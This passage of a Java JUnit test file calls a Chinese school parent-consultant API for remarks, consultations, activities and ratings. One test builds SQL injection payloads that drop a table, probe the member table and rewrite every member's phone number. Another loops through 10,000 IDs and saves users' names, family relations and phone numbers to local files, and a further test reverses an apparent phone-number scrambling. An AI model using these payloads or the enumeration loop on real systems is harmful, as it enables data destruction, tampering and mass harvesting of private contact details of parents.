	}
	
	/**
	 * 顾问对家长备注查询
	 */
	@Test
	public void findStudentRemarks(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/studentRemarks/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	
	/**
	 * 对家长咨询添加
	 */
	@Test
	public void addConsult(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",discription:\"发布学习内容2\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/consult/add")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 对家长咨询查询
	 */
	@Test
	public void findConsult(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/consult/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 参加活动类型列表
	 */
	@Test
	public void findAdviserActivity(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/adviserActivity/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	
	/**
	 * 参加活动添加
	 * 
	 * 
	 */
	@Test
	public void addAdviserActivityRecord(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",adviserActivityId:\"f1772336f4cd489e8ef0ad18d51f2446\",content:\"测试\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/adviserActivityRecord/add")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 参加活动查询
	 */
	@Test
	public void findAdviserActivityRecord(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/adviserActivityRecord/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	
	/**
	 * 家长星级设置
	 */
	@Test
	public void updateMemberStar(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",starLevel:\"0,1,0,1,0\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/member/updateStar")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 家长星级查询
	 */
	@Test
	public void findMemberStar(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/member/star")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	
	/**
	 * 
	 * 
	 * sql注入
	 * app广告接口
	 */
	@Test
	public void findAppAdList(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
//		params.setPostData("{adType:\"2\",typeApp:\"1\"}");
		//AppAdDao.findAppAdList("5", "1';BEGIN;drop table s_adviser_remarks;COMMIT;--");
		
		
		
		params.setPostData("{adType:\"5\",typeApp:\"1';BEGIN;drop table s_adviser_plan;COMMIT;--\"}");

		params.setPostData("{adType:\"5\",typeApp:\"1'  or 1=(select count(*) from s_member)--\"}");
		
		// 
		params.setPostData("{adType:\"5\",typeApp:\"1'  or 1=(select count(*) from s_member)--\"}");
		
		params.setPostData("{adType:\"5\",typeApp:\"1';BEGIN;update s_member m set mobilephone=(to_number(m.mobilephone,'99999999999')+to_number(substring(m.mobilephone,2,2),'99'));COMMIT;--\"}");
		
		
		
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		
		
		String dd=Json.toJson(params);
		System.out.println("dd:"+dd);
		
//		HttpUriRequest httpUriRequest = RequestBuilder.post()
//				.setUri(BASE_URI+"/service/appAd/list")
//				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
//				.build();
//		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
//		System.out.println(Json.toJson(result));
		
	}
	
	
	
	
	/**
	 * 班级通讯录查找
	 */
	@Test
	public void findMemberByClassId(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{classId:\"7c0af3b484364eb6b5e1011b58fb0688\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/findMemberByClassId")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 班级通讯录查找
	 */
	@Test
	public void findMemberByHxid(){
		
		for(int i=0;i<10000;i++){
			String accessToken="zjlwm";
			PostParamsModel params=new PostParamsModel();
			params.setNonce((int)((Math.random()*9+1)*100000)+"");
			params.setPostData("{hxid:\"hxid"+i+"\"}");
			String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
			params.setSignature(signature);
			HttpUriRequest httpUriRequest = RequestBuilder.post()
					.setUri(BASE_URI+"/service/member/findMemberByHxid")
					.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
					.build();
			ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
			File ynText=new File("c:/yn.txt");
			File ynMoble=new File("c:/yn_mobile.txt");
			if(result.isSuccess()){
				Files.appendWrite(ynText, Json.toJson(result));
				Files.appendWrite(ynText,"\n");
				Map<String, Object>data=result.getData();
				String userName=data.get("userName").toString();
				String mobilephone=data.get("mobilephone").toString();
				String familyrelation=data.get("familyrelation").toString();
				
				Files.appendWrite(ynMoble, userName+"("+familyrelation+"):"+mobilephone+"\n");
			}
			
		}
		
	}
	
	
	@Test
	public void mobleTest(){
		File ynMoble=new File("c:/yn_mobile.txt");
		File ynMobleK=new File("c:/yn_mobile_k.txt");
		List<String>readList=Files.readLines(ynMoble);
		for(String mobile:readList){
			if(StringUtils.isNotBlank(mobile)){
				String data[]=mobile.split(":");
				if(data.length==2){
					String moble=data[1];
					String su=moble.substring(1, 3);
					Long mobleNew=Long.parseLong(moble)-Long.parseLong(su);
					Files.appendWrite(ynMobleK, data[0]+":"+mobleNew+"\n");
				}
				
			}
			
		}
	}
	
	
	
	
	
	/**
	 * 点赞、分享
	 */
	@Test
	public void praiseSave(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{\"type\":\"1\",\"memberId\":\"630d9392ed6540da96f92907151dc3b7\",\"url\":\"http://www.ynjtjy.com/wap/info/text/2283.jspx\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/praise/praiseSave")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 访问限制
	 */
	@Test
	public void accessSettings(){
		
		
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{\"time\":\"1412870400000\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		System.out.println(Json.toJson(params));
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/accessSettings")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	@Test
	public void getDate() throws ParseException{
		String datestr1="2015-05-10";
		Date oldDate=DateUtils.parseDate(datestr1, "yyyy-MM-dd");
		
		System.out.println("oldDate:"+oldDate.getTime());
		
		
		
		String datestr2="2019-05-10";
		Date newDate=DateUtils.parseDate(datestr2, "yyyy-MM-dd");
		
		System.out.println("newDate:"+newDate.getTime());
		
		
	}
}
